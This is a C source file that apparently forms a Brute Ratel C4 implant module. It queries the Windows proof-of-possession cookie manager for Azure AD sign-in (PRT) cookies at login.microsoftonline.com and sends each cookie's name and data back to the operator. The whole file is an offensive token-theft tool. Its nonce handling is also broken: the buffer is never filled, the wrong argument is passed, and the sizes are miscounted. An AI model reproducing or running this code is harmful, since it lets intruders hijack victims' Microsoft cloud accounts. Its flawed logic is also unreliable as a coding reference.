#include <windows.h>
#include <stdio.h>
#include <proofofpossessioncookieinfo.h>
#include "badger_exports.h"

WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t *_Str);
WINBASEAPI int __cdecl MSVCRT$vsnprintf(char * __restrict__ d,size_t n,const char * __restrict__ format,va_list arg);
WINBASEAPI errno_t __cdecl MSVCRT$mbstowcs_s(size_t *pReturnValue, wchar_t * wcstr, size_t smt,const char *mbstr, size_t count);

WINBASEAPI LPWSTR WINAPI KERNEL32$lstrcpynW (LPWSTR lpString1, LPCWSTR lpString2, int iMaxLength);
WINBASEAPI LPWSTR WINAPI KERNEL32$lstrcatW (LPWSTR lpString1, LPCWSTR lpString2);
WINBASEAPI int WINAPI Kernel32$WideCharToMultiByte (UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CLSIDFromString (LPCOLESTR lpsz, LPCLSID pclsid);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$IIDFromString (LPCOLESTR lpsz, LPIID lpiid);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx (LPVOID pvReserved, DWORD dwCoInit);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance (REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID *ppv);
DECLSPEC_IMPORT void	WINAPI OLE32$CoTaskMemFree(LPVOID pv);

typedef interface IProofOfPossessionCookieInfoManager IProofOfPossessionCookieInfoManager;

DECLSPEC_IMPORT HRESULT WINAPI COOKIE$GetCookieInfoForUri(LPCWSTR uri, DWORD *cookieInfoCount, ProofOfPossessionCookieInfo **cookieInfo);

int requestaadprt(LPCWSTR uri) {
	BadgerDispatch(g_dispatch, "Using uri: %ls\n", uri);
	DWORD cookieCount = 0;
	ProofOfPossessionCookieInfo* cookies;
	IProofOfPossessionCookieInfoManager* popCookieManager;
	GUID CLSID_ProofOfPossessionCookieInfoManager;
	GUID IID_IProofOfPossessionCookieInfoManager;

	OLE32$CLSIDFromString(L"{A9927F85-A304-4390-8B23-A75F1C668600}", &CLSID_ProofOfPossessionCookieInfoManager);
	OLE32$IIDFromString(L"{CDAECE56-4EDF-43DF-B113-88E4556FA1BB}", &IID_IProofOfPossessionCookieInfoManager);

	HRESULT hr = OLE32$CoInitializeEx(NULL, 0x0);
	if (hr == RPC_E_CHANGED_MODE){
		hr = OLE32$CoInitializeEx(NULL, 0x2);	
	}
	if (FAILED(hr))	{
		BadgerDispatch(g_dispatch, "[!] CoInitialize error: 0x%04x\n", hr);
		return 0;
	}

	hr = OLE32$CoCreateInstance(&CLSID_ProofOfPossessionCookieInfoManager, NULL, CLSCTX_INPROC_SERVER, &IID_IProofOfPossessionCookieInfoManager, (void**)(&popCookieManager));
	if (FAILED(hr))	{
		BadgerDispatch(g_dispatch, "[!] CoCreateInstance error: 0x%4x\n", hr);;
		return 0;
	}

	hr = popCookieManager->lpVtbl->GetCookieInfoForUri(popCookieManager, uri, &cookieCount, &cookies);
	if (FAILED(hr))	{
		BadgerDispatch(g_dispatch, "[!] GetCookieInfoForUri error: 0x%4x\n", hr);
		return 0;
	}

	if (cookieCount == 0) {
		BadgerDispatch(g_dispatch, "[*] No cookies for the URI\n");
		return 0;
	}

	for (DWORD i = 0; i < cookieCount; i++) {
		BadgerDispatch(g_dispatch, "Name %ls\n", cookies[i].name);
		BadgerDispatch(g_dispatch, "Data: %ls\n", cookies[i].data);
		BadgerDispatch(g_dispatch, "Flags: %x\n", cookies[i].flags);
		BadgerDispatch(g_dispatch, "P3PHeader: %ls\n\n", cookies[i].p3pHeader);

		OLE32$CoTaskMemFree(cookies[i].name);
		OLE32$CoTaskMemFree(cookies[i].data);
		OLE32$CoTaskMemFree(cookies[i].p3pHeader);
	}
	OLE32$CoTaskMemFree(cookies);
	return 0;
}

void coffee(char** argv, int argc, WCHAR** dispatch){
	const wchar_t * nonce = NULL;

    // Optional argument nonce
    if (argc >= 1) {
        LPSTR pszNonce = argv[0];
        int len = MultiByteToWideChar(CP_ACP, 0, pszNonce, -1, NULL, 0);

        if (len > 0) {
            nonce = (wchar_t *)BadgerAlloc(len * sizeof(wchar_t));
            if (nonce == NULL){
                BadgerDispatch(g_dispatch, "[!] BadgerAlloc failed.\n");
                return;
            }
        }
    }

    // TODO: Build URL here and pass to requestaadprt... That way cleanup is easier
	LPCWSTR uri = L"https://login.microsoftonline.com/";
	wchar_t * full_uri = NULL;

	if (nonce != NULL) {
		const wchar_t * base_url = L"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=";

		full_uri = (wchar_t*)BadgerAlloc(MSVCRT$wcslen(base_url) + MSVCRT$wcslen(nonce) + 2*sizeof(wchar_t));
		if(full_uri == NULL){
			BadgerDispatch(g_dispatch, "[!] Failed to initialize memory.\n");
			goto cleanup;
		}
		KERNEL32$lstrcpynW(full_uri, base_url, MSVCRT$wcslen(base_url) + MSVCRT$wcslen(nonce));
		KERNEL32$lstrcatW(full_uri, nonce);
		uri = full_uri;
	}


	requestaadprt(nonce);

cleanup:
    if(nonce) BadgerFree((PVOID*)&nonce);
    if(full_uri) BadgerFree((PVOID*)&full_uri);
};
